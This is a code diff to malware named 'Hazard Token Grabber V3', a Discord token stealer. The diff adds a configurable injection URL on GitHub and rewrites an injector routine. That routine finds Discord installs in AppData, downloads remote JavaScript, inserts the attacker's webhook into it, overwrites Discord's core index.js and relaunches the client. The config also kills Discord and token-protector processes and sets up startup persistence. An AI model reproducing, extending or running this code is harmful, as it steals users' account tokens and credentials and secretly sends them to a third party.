@@ -22,6 +22,8 @@ from win32crypt import CryptUnprotectData
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
     'webhook': "WEBHOOK_HERE",
+    # keep it as it is unless you want to have a custom one
+    'injection_url': "https://raw.githubusercontent.com/Rdmo1/Hazard-Token-Grabber-V3/main/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
@@ -190,16 +192,30 @@ class Hazard_Token_Grabber_V3(functions):
             pass
 
     async def injector(self):
-         for _dir in os.listdir(os.getenv('localappdata')):
-        if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
-                if re.match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
-                    f = requests.get("https://raw.githubusercontent.com/your-bestie/Discord-Injection/master/Injection-clean.js").text.replace("%WEBHOOK%", self.webhook)
-                    with open(abspath+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-                        indexFile.write(f)
-                    os.startfile(abspath+os.sep+_dir+'.exe')
-                    
+        for _dir in os.listdir(self.appdata):
+            if 'discord' in _dir.lower():
+                discord = self.appdata+self.sep+_dir
+                disc_sep = discord+self.sep
+                for __dir in os.listdir(os.path.abspath(discord)):
+                    if match(r'app-(\d*\.\d*)*', __dir):
+                        app = os.path.abspath(disc_sep+__dir)
+                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
+                        if os.path.exists(inj_path):
+                            if self.startup_loc not in argv[0]:
+                                try:
+                                    os.makedirs(
+                                        inj_path+'initiation', exist_ok=True)
+                                except PermissionError:
+                                    pass
+                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
+                                "%WEBHOOK%", self.webhook)
+                            try:
+                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                    indexFile.write(f)
+                            except PermissionError:
+                                pass
+                            os.startfile(app + self.sep + _dir + '.exe')
+
     async def killProcesses(self):
         blackListedPrograms = self.fetchConf('blackListedPrograms')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
